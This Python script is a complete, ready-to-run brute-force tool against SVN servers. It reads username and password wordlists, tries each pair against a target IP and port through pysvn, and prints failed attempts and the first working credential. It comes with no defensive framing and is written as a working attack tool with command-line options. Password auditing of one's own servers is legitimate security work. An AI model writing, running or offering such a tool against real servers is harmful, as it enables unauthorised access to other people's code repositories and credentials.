import pysvn
import argparse

def check_svn_login(client, url, username, password):
    try:
        client.callback_get_login = lambda realm, username, may_save: (True, username, password, False)
        client.ls(url)
        return True
    except pysvn.ClientError as e:
        return False

def run_bruteforce(user_file, pass_file, target_ip, port):
    url = f'svn://{target_ip}:{port}'
    client = pysvn.Client()

    with open(user_file, 'r') as uf:
        usernames = [line.strip() for line in uf]

    with open(pass_file, 'r') as pf:
        passwords = [line.strip() for line in pf]

    for username in usernames:
        for password in passwords:
            if check_svn_login(client, url, username, password):
                print(f"Success! Username: {username}, Password: {password}")
                return
            else:
                print(f"Failed: Username: {username}, Password: {password}")

def main():
    parser = argparse.ArgumentParser(description="SVN Weak Password Brute Force Script")
    parser.add_argument('-u', '--user_file', required=True, help="Path to the username file")
    parser.add_argument('-p', '--pass_file', required=True, help="Path to the password file")
    parser.add_argument('-t', '--target_ip', required=True, help="Target IP address of the SVN server")
    parser.add_argument('-P', '--port', required=True, help="Target port of the SVN server")

    args = parser.parse_args()

    run_bruteforce(args.user_file, args.pass_file, args.target_ip, args.port)

if __name__ == "__main__":
    main()